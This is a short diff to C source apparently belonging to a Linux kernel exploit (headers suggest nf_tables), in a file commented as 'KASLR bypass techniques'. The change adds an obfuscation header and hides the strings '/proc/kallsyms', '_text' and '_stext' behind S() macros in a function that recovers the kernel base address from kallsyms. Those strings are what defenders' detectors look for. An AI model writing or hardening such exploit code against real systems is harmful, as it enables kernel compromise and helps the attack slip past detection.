@@ -1,6 +1,7 @@
 #include "nfttables.h"
 #include "arch.h"
 #include "offsets.h"
+#include "obf.h"
 
 /*
  * KASLR bypass techniques.
@@ -14,7 +15,7 @@
 
 uint64_t kaslr_from_kallsyms(void)
 {
-    FILE *f = fopen("/proc/kallsyms", "r");
+    FILE *f = fopen(S(S_PROC_KALLSYMS), "r");
     if (!f) return 0;
 
     char line[256];
@@ -26,7 +27,7 @@ uint64_t kaslr_from_kallsyms(void)
         if (sscanf(line, "%lx %c %127s", &addr, &type, sym) != 3)
             continue;
         /* _text or _stext is the kernel text base */
-        if (strcmp(sym, "_text") == 0 || strcmp(sym, "_stext") == 0) {
+        if (strcmp(sym, S(S_TEXT)) == 0 || strcmp(sym, S(S_STEXT)) == 0) {
             base = addr;
             break;
         }
